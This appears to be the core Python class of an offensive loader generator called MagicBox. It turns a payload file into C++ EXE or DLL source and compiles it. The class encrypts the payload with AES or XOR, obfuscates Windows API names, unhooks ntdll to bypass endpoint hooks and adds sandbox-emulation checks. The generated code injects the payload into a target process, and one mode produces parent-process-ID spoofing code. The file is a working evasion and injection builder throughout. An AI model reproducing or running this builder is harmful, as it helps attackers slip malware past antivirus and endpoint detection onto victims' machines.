import os

from code_templates import crypt, emulation, injection, ppid_spoofing, unhook, headers
from helpers import encrypt, constants, random

class MagicBoxException(Exception):
    def __init__(self, message):
        super().__init__(message)

class MagicBox:

    def __init__(self):    
        self.payload = None
        self.payloadKey = None
        self.payloadDecryptionRoutine = ""
        self.payloadVariableName = random.generateVariableName()
        self.payloadLengthVariableName = random.generateVariableName()
        self.payloadKeyVariableName = random.generateVariableName()
        self.payloadKeyLengthVariableName = random.generateVariableName()

        self.headers = []

        self.winAPIs = []
        self.winAPIKey = None
        self.winAPIKeyVariableName = random.generateVariableName()
        self.winAPIKeyLengthVariableName = random.generateVariableName()

        self.encryption = None
        self.encryptionCodeBase = ""

        self.unhooking = None
        self.unhookingCodeBase = ""
        self.unhookingMain = ""

        self.injection = None
        self.injectionCodeBase = ""
        self.injectionMain = ""

        self.emulationMain = ""

        self.PPIDSpoofingCodeBase = ""
        self.PPIDSpoofingMain = ""

        self.finalCode = ""
        self.filename = None
        self.format = None


    def __addRequiredHeaders(self, newHeaders):
        for header in newHeaders:
            if header not in self.headers:
                self.__addRequiredHeaders(header["dependencies"])
                self.headers.append(header)

    def __addRequiredWinAPIs(self, newWinAPIs):
        for winAPI in newWinAPIs:
            if winAPI not in self.winAPIs:
                self.winAPIs.append(winAPI)

    def __getHeadersCode(self):
        codeToInclude = ""
        for header in self.headers:
            codeToInclude += header["code"] + "\n"
        return codeToInclude

    def __getWinAPIsCode(self):
        unformattedWinAPIKey = random.generateKey()
        codeBaseToInclude = """
unsigned char {winAPIKeyVariableName}[] = {{ {winAPIKey} }};
unsigned int {winAPIKeyLengthVariableName} = sizeof({winAPIKeyVariableName});
        """.format(
            winAPIKeyVariableName = self.winAPIKeyVariableName,
            winAPIKey = encrypt.format(unformattedWinAPIKey),
            winAPIKeyLengthVariableName = self.winAPIKeyLengthVariableName
        )
        mainToInclude = ""
        for winAPI in self.winAPIs:
            encryptedWinAPIString = encrypt.xor(winAPI['name'] + '\x00', unformattedWinAPIKey)
            decryptionRoutine = crypt.xorDecryptionRoutine(
                "s" + winAPI['name'],
                "len" + winAPI['name'],
                self.winAPIKeyVariableName,
                self.winAPIKeyLengthVariableName
            )
            formattedCodeBase = winAPI["code"].format(encryptedString=encryptedWinAPIString)
            mainFormattedCode = winAPI["mainCode"].format(decryptionRoutine=decryptionRoutine)
            codeBaseToInclude += formattedCodeBase
            mainToInclude += mainFormattedCode
        self.winAPIKey = encrypt.format(unformattedWinAPIKey)
        return codeBaseToInclude, mainToInclude

    def __getPayloadCode(self):
        payloadKeyCodeBase = ""
        if self.encryption != None:
            payloadKeyCodeBase = """
unsigned char {payloadKeyVariableName}[] = {{ {payloadKey} }};
unsigned int {payloadKeyLengthVariableName} = sizeof({payloadKeyVariableName});
            """.format(
                payloadKeyVariableName = self.payloadKeyVariableName,
                payloadKey = self.payloadKey,
                payloadKeyLengthVariableName = self.payloadKeyLengthVariableName
            )
        
        payloadCodeBase = """
unsigned char {payloadVariableName}[] = {{ {payload} }};
unsigned int {payloadLengthVariableName} = sizeof({payloadVariableName});
{payloadKeyCodeBase}    
        """.format(
            payloadVariableName = self.payloadVariableName,
            payload = self.payload,
            payloadLengthVariableName = self.payloadLengthVariableName,
            payloadKeyCodeBase = payloadKeyCodeBase
        )

        return payloadCodeBase


    def setPayload(self, payload):
        self.payload = open(payload, "rb").read()

    def setEncryption(self, alg):
        if self.payload == None:
            raise MagicBoxException("Cannot encrypt an empty payload.")

        if self.encryption != None:
            raise MagicBoxException("Encryption setting already set.")

        if alg is None:
            self.payload = encrypt.format(self.payload)
        else:
            unformattedPayloadKey = random.generateKey()
            if alg == constants.Encryption.aes:
                self.payload = encrypt.aes(self.payload, unformattedPayloadKey)
                self.payloadDecryptionRoutine = crypt.aesDecryptionRoutine(
                    self.payloadVariableName, 
                    self.payloadLengthVariableName, 
                    self.payloadKeyVariableName, 
                    self.payloadKeyLengthVariableName
                )
                aesHeaders, aesCodeBase = crypt.aesDecrypt()
                self.__addRequiredHeaders(aesHeaders)
                self.encryptionCodeBase = aesCodeBase

            elif alg == constants.Encryption.xor:
                self.payload = encrypt.xor(self.payload, unformattedPayloadKey)
                self.payloadDecryptionRoutine = crypt.xorDecryptionRoutine(
                    self.payloadVariableName, 
                    self.payloadLengthVariableName, 
                    self.payloadKeyVariableName, 
                    self.payloadKeyLengthVariableName
                )
                # No XOR codebase added since XOR is added by default (required for WinAPIs)
            else:
                raise MagicBoxException("Unknown encryption algorithm.")

            self.payloadKey = encrypt.format(unformattedPayloadKey)

        self.encryption = alg

    def setUnhooking(self, technique):
        if self.unhooking != None:
            raise MagicBoxException("Unhooking setting already set.")
        
        unhookHeaders = []
        unhookWinAPIs = []
        unhookCodeBase = ""
        unhookMain = ""
        if (technique == constants.Unhooking.freshCopy):
            ntdllKey = random.generateKey()
            ntdllPath = encrypt.xor(constants.NTDLL_PATH, ntdllKey)
            sNtdllPath = random.generateVariableName()
            sNtdllPath_len = random.generateVariableName()
            sNtdllKey = random.generateVariableName()
            sNtdllKey_len = random.generateVariableName()
            ntdllDecryptionRoutine = crypt.xorDecryptionRoutine(sNtdllPath, sNtdllPath_len, sNtdllKey, sNtdllKey_len)
            unhookHeaders, unhookWinAPIs, unhookCodeBase, unhookMain = unhook.freshCopy(
                ntdllPath,
                encrypt.format(ntdllKey),
                ntdllDecryptionRoutine,
                sNtdllPath,
                sNtdllPath_len,
                sNtdllKey,
                sNtdllKey_len
            )
        elif technique == constants.Unhooking.perunsFart:
            unhookHeaders, unhookWinAPIs, unhookCodeBase, unhookMain = unhook.perunsFart()
        elif technique != None:
            raise MagicBoxException("Unknown unhooking technique.")

        self.__addRequiredHeaders(unhookHeaders)
        self.__addRequiredWinAPIs(unhookWinAPIs)
        self.unhookingCodeBase = unhookCodeBase
        self.unhookingMain = unhookMain

        self.unhooking = technique

    def setInjection(self, technique, target):
        if technique is None:
            return
        
        if target is None:
            raise MagicBoxException("A process target must be specified for this injection technique.")

        injectionHeaders = []
        injectionWinAPIs = []
        injectionCodeBase = ""
        injectionMain = ""

        if self.injection != None:
            raise MagicBoxException("Injection setting already set.")

        # WIP: Only classic injection is supported at the moment
        if technique == constants.Injection.CLASSIC:
            injectionHeaders, injectionWinAPIs, injectionCodeBase, injectionMain = injection.classic(
                target,
                self.payloadDecryptionRoutine,
                self.payloadVariableName,
                self.payloadLengthVariableName
            )
        else:
            raise MagicBoxException("Unknown injection technique.")

        self.__addRequiredHeaders(injectionHeaders)
        self.__addRequiredWinAPIs(injectionWinAPIs)
        self.injectionCodeBase = injectionCodeBase
        self.injectionMain = injectionMain

        self.injection = technique

    def setEmulation(self):
        emulationHeaders, emulationWinAPIs, emulationCodeBase, emulationMain = emulation.unimplementedAPIs()
        self.__addRequiredHeaders(emulationHeaders)
        self.__addRequiredWinAPIs(emulationWinAPIs)
        self.emulationMain = emulationMain
        pass

    def gatherGenerationCode(self, format):
        if self.payload is None:
            raise MagicBoxException("Payload must be set before generating any code.")

        if self.injection is None:
            raise MagicBoxException("Injection setting must be set before generating any code.")


        # Add XOR by default
        xorHeaders, xorCodeBase = crypt.xor()
        self.__addRequiredHeaders(xorHeaders)

        if format == constants.Formats.dll:
            self.__addRequiredHeaders([headers.USER_32_LIB])
        headersCodeBase = self.__getHeadersCode()
        winAPICodeBase, winAPIMain = self.__getWinAPIsCode()

        payloadCodeBase = self.__getPayloadCode()


        if format == constants.Formats.dll:
            self.finalCode = """
                {headersCodeBase}
                {payloadCodeBase}
                {xorCodeBase}
                {winAPICodeBase}
                {encryptionCodeBase}
                {unhookingCodeBase}
                {injectionCodeBase}

                BOOL APIENTRY DllMain( HMODULE hModule,
                   DWORD  ul_reason_for_call,
                   LPVOID lpReserved
                 )
                {{
                switch (ul_reason_for_call)
                {{
                case DLL_PROCESS_ATTACH:
                case DLL_THREAD_ATTACH:
                case DLL_THREAD_DETACH:
                case DLL_PROCESS_DETACH:
                    {winAPIMain}
                    {emulationMain}
                    {unhookingMain}
                    {injectionMain}
                    break;
                }}
                return TRUE;
                }}

                extern "C" {{
                __declspec(dllexport) void CALLBACK entry(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
                    {{
                        
                    }}
                }}
            """.format(
                headersCodeBase = headersCodeBase,
                xorCodeBase = xorCodeBase,
                winAPICodeBase = winAPICodeBase,
                encryptionCodeBase = self.encryptionCodeBase,
                unhookingCodeBase = self.unhookingCodeBase,
                injectionCodeBase = self.injectionCodeBase,
                payloadCodeBase = payloadCodeBase,
                emulationMain = self.emulationMain,
                winAPIMain = winAPIMain,
                unhookingMain = self.unhookingMain,
                injectionMain = self.injectionMain
            )
        else:        
            self.finalCode = """
    {headersCodeBase}
    {payloadCodeBase}
    {xorCodeBase}
    {winAPICodeBase}
    {encryptionCodeBase}
    {unhookingCodeBase}
    {injectionCodeBase}
    int main(void) {{
    {winAPIMain}
    {emulationMain}
    {unhookingMain}
    {injectionMain}
        return 0;
    }}
            """.format(
                headersCodeBase = headersCodeBase,
                xorCodeBase = xorCodeBase,
                winAPICodeBase = winAPICodeBase,
                encryptionCodeBase = self.encryptionCodeBase,
                unhookingCodeBase = self.unhookingCodeBase,
                injectionCodeBase = self.injectionCodeBase,
                payloadCodeBase = payloadCodeBase,
                emulationMain = self.emulationMain,
                winAPIMain = winAPIMain,
                unhookingMain = self.unhookingMain,
                injectionMain = self.injectionMain
            )
        
        self.format = format


    def setPPIDSpoofing(self, parent, child):
        spoofHeaders, spoofWinAPIs, spoofCodeBase, spoofMain = ppid_spoofing.classic(parent, child)
        self.__addRequiredHeaders(spoofHeaders)
        self.__addRequiredWinAPIs(spoofWinAPIs)
        self.PPIDSpoofingCodeBase = spoofCodeBase
        self.PPIDSpoofingMain = spoofMain

    def gatherSpoofingCode(self):
        xorHeaders, xorCodeBase = crypt.xor()
        self.__addRequiredHeaders(xorHeaders)

        headersCodeBase = self.__getHeadersCode()
        winAPICodeBase, winAPIMain = self.__getWinAPIsCode()

        self.finalCode = """
{headersCodeBase}
{xorCodeBase}
{winAPICodeBase}
{spoofCodeBase}
int main(void) {{
{winAPIMain}
{spoofMain}
    return 0;
}}
        """.format(
            headersCodeBase = headersCodeBase,
            xorCodeBase = xorCodeBase,
            winAPICodeBase = winAPICodeBase,
            spoofCodeBase = self.PPIDSpoofingCodeBase,
            winAPIMain = winAPIMain,
            spoofMain = self.PPIDSpoofingMain,
        )


    def writeCodeToFile(self, filename):
        with open(f"{filename}.cpp", "w+") as f:
            f.write(self.finalCode)
            f.close()

        self.filename = filename

    def compile(self):
        if f"{self.filename}.cpp" is None:
            raise MagicBoxException("Code needs to be written to file first.")

        if self.format == constants.Formats.dll:
            print("DLL")
            os.system(f"cl.exe /D_USRDLL /D_WINDLL {self.filename}.cpp /MT /link /DLL /OUT:{self.filename}.dll /MACHINE:x64")
        else:      
            print("NOT DLL")
            os.system(f"cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tp {self.filename}.cpp /link /OUT:{self.filename}.exe /SUBSYSTEM:CONSOLE /MACHINE:x64") 
            

    def cleanup(self):
        if os.path.exists(f"{self.filename}.cpp"):
            os.remove(f"{self.filename}.cpp")
        if os.path.exists(f"{self.filename}.obj"):
            os.remove(f"{self.filename}.obj")
        if os.path.exists(f"{self.filename}.exp"):
            os.remove(f"{self.filename}.exp")
        if os.path.exists(f"{self.filename}.lib"):
            os.remove(f"{self.filename}.lib")



